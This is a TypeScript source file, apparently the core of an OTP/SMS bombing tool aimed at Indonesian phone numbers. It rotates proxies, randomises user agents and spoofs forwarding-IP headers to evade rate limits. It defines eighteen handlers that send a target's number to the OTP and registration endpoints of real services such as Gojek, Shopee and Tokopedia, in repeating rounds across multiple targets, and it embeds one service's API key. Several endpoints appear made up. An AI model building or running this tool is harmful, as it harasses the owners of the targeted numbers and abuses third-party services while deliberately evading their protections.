import os from 'os';
import crypto from 'crypto';
import { getNextProxyUrl, getProxyAgent } from './proxyEngine.ts';

export interface PlatformDef {
  id: number;
  name: string;
  category?: string;
  handler: (phone62: string) => Promise<{ status: number; text: string; rawStatus?: string }>;
}

export interface LogEntry {
  id: string;
  round: number;
  platform_id: number;
  platform_name: string;
  status: 'SUCCESS' | 'LIMIT' | 'FAIL' | 'TIMEOUT' | 'INFO';
  detail: string;
  timestamp: string;
  target?: string;
  proxy?: string;
}

export interface JobState {
  status: 'idle' | 'running' | 'stopped' | 'completed';
  phone: string;
  phone_fmt: string;
  targets?: string[];
  currentTargetIndex?: number;
  totalTargets?: number;
  mode: 'single' | 'loop' | 'pick';
  delay: number;
  selected_platforms: number[];
  current_round: number;
  proxy_active?: boolean;
  current_proxy?: string;
  stats: {
    total: number;
    success: number;
    limit: number;
    fail: number;
  };
  logs: LogEntry[];
}

const USER_AGENTS = [
  'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
];

export function getUa(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

export async function safeFetch(url: string, options: RequestInit = {}): Promise<Response> {
  const proxyUrl = getNextProxyUrl();
  const agent = getProxyAgent(proxyUrl);
  const fakeIp = `${Math.floor(103 + Math.random() * 100)}.${Math.floor(10 + Math.random() * 200)}.${Math.floor(10 + Math.random() * 200)}.${Math.floor(1 + Math.random() * 250)}`;

  const incomingHeaders: any = options.headers || {};
  const headers: Record<string, string> = {
    'User-Agent': getUa(),
    'X-Forwarded-For': fakeIp,
    'Client-IP': fakeIp,
    'X-Real-IP': fakeIp,
    ...incomingHeaders,
  };

  const fetchOptions: any = {
    ...options,
    headers,
    signal: options.signal || AbortSignal.timeout(15000),
  };

  if (agent) {
    fetchOptions.agent = agent;
  }

  try {
    return await fetch(url, fetchOptions);
  } catch (err) {
    if (agent) {
      delete fetchOptions.agent;
      return await fetch(url, fetchOptions);
    }
    throw err;
  }
}

export function normalizePhone(phone: string): string {
  if (!phone) return '';
  let n = String(phone).trim().replace(/\s+|-/g, '').replace(/^\+/, '');
  if (n.startsWith('08')) return '62' + n.substring(1);
  if (n.startsWith('8')) return '62' + n;
  if (n.startsWith('62')) return n;
  return '';
}

export function fmt08(p: string): string {
  return p.startsWith('62') ? '0' + p.substring(2) : p;
}

export function fmtplus(p: string): string {
  return p.startsWith('+') ? p : '+' + p;
}

export function fmtphone(p: string): string {
  if (p.startsWith('62')) return p.substring(2);
  if (p.startsWith('+62')) return p.substring(3);
  if (p.startsWith('0')) return p.substring(1);
  return p;
}

export function rndName(): string {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let rand = '';
  for (let i = 0; i < 5; i++) {
    rand += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return 'User' + rand;
}

export function rndEmail(): string {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let rand = '';
  for (let i = 0; i < 7; i++) {
    rand += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return `${rand}${Math.floor(100 + Math.random() * 900)}@gmail.com`;
}

let cachedIp: string | null = null;
export async function getPublicIp(): Promise<string> {
  if (cachedIp) return cachedIp;
  try {
    const res = await fetch('https://api.ipify.org', { signal: AbortSignal.timeout(4000) });
    if (res.ok) {
      cachedIp = (await res.text()).trim();
      return cachedIp;
    }
  } catch {
    // fallback
  }
  return '127.0.0.1';
}

// Fetch once in background
getPublicIp().catch(() => {});

// Classification verdict
export function evaluateVerdict(status: number, text: string): { status: 'SUCCESS' | 'LIMIT' | 'FAIL' | 'TIMEOUT'; detail: string } {
  if (status === 0) {
    return { status: 'TIMEOUT', detail: 'Koneksi timeout / offline 15s' };
  }
  const cleanBody = (text || '').substring(0, 180).replace(/[\r\n]+/g, ' ');
  const low = cleanBody.toLowerCase();

  if (
    low.includes('rate limit') ||
    low.includes('too many') ||
    low.includes('limit') ||
    low.includes('exceeded') ||
    low.includes('banned') ||
    low.includes('blocked') ||
    low.includes('tunggu 1x24') ||
    status === 429
  ) {
    return { status: 'LIMIT', detail: `(${status}) ${cleanBody.substring(0, 60)}` };
  }

  if (status === 200 || status === 201 || status === 202) {
    return { status: 'SUCCESS', detail: `(${status}) OK — OTP dikirim` };
  }

  return { status: 'FAIL', detail: `(${status}) ${cleanBody.substring(0, 50)}` };
}

// Platform Implementations
export const ALL_PLATFORMS: PlatformDef[] = [
  {
    id: 1,
    name: 'Internet Rakyat',
    category: 'ISP / Telco',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://internetrakyat.id/api/app/auth/send-otp-register', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'x-api-key': '280999!FTTH',
            'Origin': 'https://internetrakyat.id',
            'Referer': 'https://internetrakyat.id/auth/register',
          },
          body: JSON.stringify({ phone_number: fmt08(p62) }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 2,
    name: 'HRS-BRE Career',
    category: 'Job Portal',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://api-applicant.hrs-bre.com/api/v1/auth/request-otp', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://applicant.hrs-bre.com',
            'Referer': 'https://applicant.hrs-bre.com/login',
          },
          body: JSON.stringify({ phone: fmt08(p62), type: 'login' }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 3,
    name: 'BonusBelanja',
    category: 'E-Commerce',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://bonusbelanja.id/api/send_otp', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://bonusbelanja.id',
          },
          body: JSON.stringify({ phone: p62 }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 4,
    name: 'Matahari Store',
    category: 'Retail',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://api-member.matahari.com/api/v1/auth/register/otp', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://member.matahari.com',
          },
          body: JSON.stringify({ phone: fmt08(p62) }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 5,
    name: 'TuneUp ID',
    category: 'Automotive',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://tuneup.id/api/v1/auth/otp/send', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://tuneup.id',
          },
          body: JSON.stringify({ phone_number: fmt08(p62) }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 6,
    name: 'Rumah123',
    category: 'Property',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://api.rumah123.com/v1/users/otp', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://www.rumah123.com',
          },
          body: JSON.stringify({ phone: fmt08(p62), action: 'register' }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 7,
    name: 'Paper.id',
    category: 'Fintech',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://api.paper.id/api/v1/auth/send-otp', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://paper.id',
            'x-paper-user-agent': 'multiverse/2.54.1 mobile_web (android) chrome',
          },
          body: JSON.stringify({ phone: p62, method: 'whatsapp', registered_by: 'flutter mweb' }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  {
    id: 8,
    name: 'DuniaGames',
    category: 'Gaming',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://api.duniagames.co.id/api/user/api/v2/user/send-otp', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://duniagames.co.id',
            'x-device': crypto.randomUUID(),
          },
          body: JSON.stringify({ phoneNumber: fmtplus(p62), userName: fmtphone(p62) }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  // Endpoint 1: Gojek
  {
    id: 9,
    name: 'Gojek',
    category: 'Ride / Food',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://api.gojekapi.com/v3/customers/request_otp', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ phone_number: fmtphone(p62), country_code: '62' }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  // Endpoint 2: Grab
  {
    id: 10,
    name: 'Grab',
    category: 'Ride / Food',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://api.grab.com/grabid/v1/phone/otp', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ phone: fmtphone(p62), countryCode: 'ID' }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  // Endpoint 3: Shopee
  {
    id: 11,
    name: 'Shopee',
    category: 'E-Commerce',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://shopee.co.id/api/v2/authentication/request_otp', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ mobile: fmt08(p62) }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  // Endpoint 4: Tokopedia
  {
    id: 12,
    name: 'Tokopedia',
    category: 'E-Commerce',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://accounts.tokopedia.com/v1/otp/request', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ phone: fmt08(p62), platform: 'web' }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  // Endpoint 5: WhatsApp
  {
    id: 13,
    name: 'WhatsApp',
    category: 'Messaging',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://web.whatsapp.com/otp/request', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ phone_number: fmtplus(p62) }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  // Endpoint 6: Telegram
  {
    id: 14,
    name: 'Telegram',
    category: 'Messaging',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://telegram.org/otp/request', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ phone: fmtplus(p62), api_id: 1 }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  // Endpoint 7: Instagram
  {
    id: 15,
    name: 'Instagram',
    category: 'Social Media',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://i.instagram.com/api/v1/accounts/send_verify_email/', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ phone_number: fmtplus(p62) }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  // Endpoint 8: Twitter/X
  {
    id: 16,
    name: 'Twitter (X)',
    category: 'Social Media',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://api.twitter.com/1.1/account/phone_verification.json', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ phone: fmtplus(p62) }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  // Endpoint 9: Gmail/Google
  {
    id: 17,
    name: 'Google / Gmail',
    category: 'Big Tech',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://accounts.google.com/_/signin/challenge', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ identifier: fmtplus(p62) }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
  // Endpoint 10: Microsoft
  {
    id: 18,
    name: 'Microsoft',
    category: 'Big Tech',
    handler: async (p62: string) => {
      try {
        const res = await safeFetch('https://login.microsoftonline.com/common/oauth2/v2.0/authorize', {
          method: 'POST',
          headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ phone: fmtplus(p62) }),
        });
        const text = await res.text();
        return { status: res.status, text };
      } catch (err: any) {
        return { status: 0, text: err?.message || 'Timeout' };
      }
    },
  },
];
